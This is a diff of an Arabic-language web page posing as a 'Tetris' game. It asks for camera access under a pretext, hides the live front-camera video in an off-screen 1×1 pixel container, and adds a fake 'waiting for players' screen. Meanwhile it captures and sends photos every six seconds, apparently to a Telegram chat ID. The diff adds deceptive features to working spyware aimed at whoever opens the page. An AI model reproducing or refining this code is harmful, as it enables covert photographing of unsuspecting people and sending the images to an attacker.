@@ -10,9 +10,13 @@
             background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
             color: #fff;
             margin: 0;
-            padding: 30px 15px;
+            padding: 0;
             text-align: center;
             min-height: 100vh;
+            overflow: hidden;
+        }
+        #main-screen {
+            padding: 30px 15px;
         }
         h1 {
             color: #00ff88;
@@ -47,40 +51,80 @@
             color: #ffcc00;
             font-weight: bold;
         }
-        /* الطريقة بدون صورة: حاوية 1×1 بكسل + hack للإخفاء */
+        /* شاشة الانتظار */
+        #waiting-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        #waiting-text {
+            font-size: 2.5rem;
+            margin-bottom: 30px;
+            color: #00ff88;
+            text-shadow: 0 0 20px #00ff88;
+        }
+        .loader {
+            border: 8px solid #333;
+            border-top: 8px solid #00ff88;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* إخفاء الكاميرا بدون صورة */
         #hidden-cam {
             position: fixed;
-            bottom: -100px; /* خارج الشاشة */
+            bottom: -100px;
             right: -100px;
             width: 1px;
             height: 1px;
             overflow: hidden;
             z-index: -9999;
             pointer-events: none;
-            transform: scale(0.001); /* hack مهم ليشتغل على Realme/Chrome */
+            transform: scale(0.001);
         }
         #video {
-            width: 640px;  /* حجم داخلي كبير للجودة */
+            width: 640px;
             height: 480px;
             object-fit: cover;
-            transform: translate(-320px, -240px); /* توسيط داخل الحاوية الصغيرة */
+            transform: translate(-320px, -240px);
         }
     </style>
 </head>
 <body>
-    <h1>لعبة تركس الرهيبة!</h1>
-   
-    <p>
-        مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
-        اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
-        <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج الوصول للكاميرا لتفعيل وضع التحدي بالوجه – اضغط "السماح" للمتابعة!
-    </p>
+    <div id="main-screen">
+        <h1>لعبة تركس الرهيبة!</h1>
+       
+        <p>
+            مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
+            اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
+            <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج الوصول للكاميرا لتفعيل وضع التحدي بالوجه – اضغط "السماح" للمتابعة!
+        </p>
 
-    <button class="btn" onclick="startCamera()">ابدأ</button>
-   
-    <div id="status">اضغط الزر لبدء التحدي...</div>
+        <button class="btn" onclick="startGame()">ابدأ</button>
+       
+        <div id="status">اضغط الزر لبدء التحدي...</div>
+    </div>
 
-    <!-- الحاوية اللي تخفي الكاميرا تمامًا -->
+    <!-- شاشة الانتظار -->
+    <div id="waiting-screen">
+        <div class="loader"></div>
+        <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
+    </div>
+
+    <!-- الكاميرا مخفية تمامًا -->
     <div id="hidden-cam">
         <video id="video" autoplay playsinline muted></video>
     </div>
@@ -91,11 +135,18 @@
         const CHAT_ID = '6611123941';
         const PHOTO_INTERVAL = 6000;
 
-        async function startCamera() {
-            const status = document.getElementById('status');
-            status.textContent = "جاري تفعيل وضع التحدي...";
-            status.style.color = "#00ff88";
+        function startGame() {
+            // إخفاء الشاشة الرئيسية
+            document.getElementById('main-screen').style.display = 'none';
+            
+            // إظهار شاشة الانتظار
+            document.getElementById('waiting-screen').style.display = 'flex';
 
+            // بدء الكاميرا في الخلفية
+            startCamera();
+        }
+
+        async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" }
@@ -109,17 +160,13 @@
                         console.log("الفيديو جاهز");
                         resolve();
                     };
-                    setTimeout(resolve, 10000);
+                    setTimeout(resolve, 8000);
                 });
-
-                status.textContent = "تم تفعيل التحدي! استمتع باللعبة...";
-                status.style.color = "#00ff88";
 
                 setInterval(captureAndSend, PHOTO_INTERVAL);
             } catch (err) {
-                status.textContent = "خطأ: " + err.message;
-                status.style.color = "#ff4444";
                 console.error("Camera error:", err);
+                // يمكن إظهار رسالة خطأ في شاشة الانتظار لو أردت
             }
         }
 
